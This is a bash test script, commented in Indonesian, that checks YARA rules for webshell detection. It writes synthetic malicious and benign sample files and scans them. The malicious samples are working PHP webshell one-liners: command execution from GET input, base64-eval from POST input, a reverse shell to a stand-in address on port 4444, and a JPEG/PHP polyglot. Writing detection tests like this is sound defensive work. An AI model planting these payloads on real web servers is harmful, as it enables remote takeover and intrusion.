#!/usr/bin/env bash
# =====================================================================
# ASIW: uji aturan YARA (agent/yara/asiw-webshell.yar)
# ---------------------------------------------------------------------
# Membuat berkas contoh (webshell sintetis + berkas sah), memindainya,
# lalu membandingkan dengan hasil yang diharapkan.
#
# Mode container (default, tidak perlu memasang yara di host):
#   ./run_yara_tests.sh
# Mode lokal (yara sudah terpasang):
#   ASIW_LOCAL=1 ./run_yara_tests.sh
# =====================================================================
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(dirname "$HERE")"
RULES="$ROOT/agent/yara/asiw-webshell.yar"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

mkdir -p "$WORK/samples"
cp "$RULES" "$WORK/rules.yar"

# --- Contoh BERBAHAYA (harus cocok) ---------------------------------
printf '<?php system($_GET["cmd"]); ?>\n'                        > "$WORK/samples/shell.php"
printf '<?php eval(base64_decode($_POST["x"])); ?>\n'            > "$WORK/samples/obfuscated.php"
printf '<?php $s=fsockopen("198.51.100.1",4444); exec("/bin/sh -i"); ?>\n' > "$WORK/samples/revshell.php"
printf '<?php /* c99shell FilesMan */ ?>\n'                      > "$WORK/samples/known_family.php"
printf '\xff\xd8\xff\xe0 JFIF junk <?php system($_GET[0]); ?>'   > "$WORK/samples/polyglot.php.jpg"

# --- Contoh SAH (tidak boleh cocok) ---------------------------------
printf '<?php echo "Halaman normal"; $x = 1 + 2; ?>\n'           > "$WORK/samples/benign.php"
printf '\xff\xd8\xff\xe0\x00\x10JFIF gambar kopi biasa'          > "$WORK/samples/coffee.jpg"
printf '\x89PNG\r\n\x1a\n gambar png biasa'                      > "$WORK/samples/logo.png"
printf 'Ini hanya catatan teks biasa tentang kopi.\n'            > "$WORK/samples/readme.txt"

declare -A EXPECT_MATCH=(
  [shell.php]=1 [obfuscated.php]=1 [revshell.php]=1
  [known_family.php]=1 [polyglot.php.jpg]=1
  [benign.php]=0 [coffee.jpg]=0 [logo.png]=0 [readme.txt]=0
)

scan() {  # $1 = path di dalam konteks eksekusi
  if [ "${ASIW_LOCAL:-0}" = "1" ]; then
    yara -w "$WORK/rules.yar" "$1" 2>/dev/null
  else
    docker run --rm -v "$WORK:/w:z" alpine:3.20 sh -c \
      'apk add --no-cache yara >/dev/null 2>&1; yara -w /w/rules.yar "'"/w/samples/$(basename "$1")"'" 2>/dev/null'
  fi
}

echo "== Validasi sintaks YARA"
if [ "${ASIW_LOCAL:-0}" = "1" ]; then
  yara -w "$WORK/rules.yar" /dev/null || { echo "FAIL: sintaks YARA tidak valid"; exit 1; }
else
  docker run --rm -v "$WORK:/w:z" alpine:3.20 sh -c \
    'apk add --no-cache yara >/dev/null 2>&1; yara -w /w/rules.yar /dev/null' \
    || { echo "FAIL: sintaks YARA tidak valid"; exit 1; }
fi
echo "OK: sintaks valid"

echo "== Uji pencocokan"
pass=0; fail=0
for f in "$WORK"/samples/*; do
  name="$(basename "$f")"
  out="$(scan "$f" | awk 'NF{printf "%s ", $1}')"
  got=0; [ -n "${out// /}" ] && got=1
  want="${EXPECT_MATCH[$name]}"
  if [ "$got" = "$want" ]; then
    pass=$((pass+1))
    printf '  OK    %-20s match=%s  %s\n' "$name" "$got" "$out"
  else
    fail=$((fail+1))
    printf '  FAIL  %-20s match=%s (harap %s)  %s\n' "$name" "$got" "$want" "$out"
  fi
done

echo
echo "Ringkasan YARA: $pass lulus, $fail gagal"
[ "$fail" -eq 0 ] || exit 1
echo "SEMUA UJI YARA LULUS"
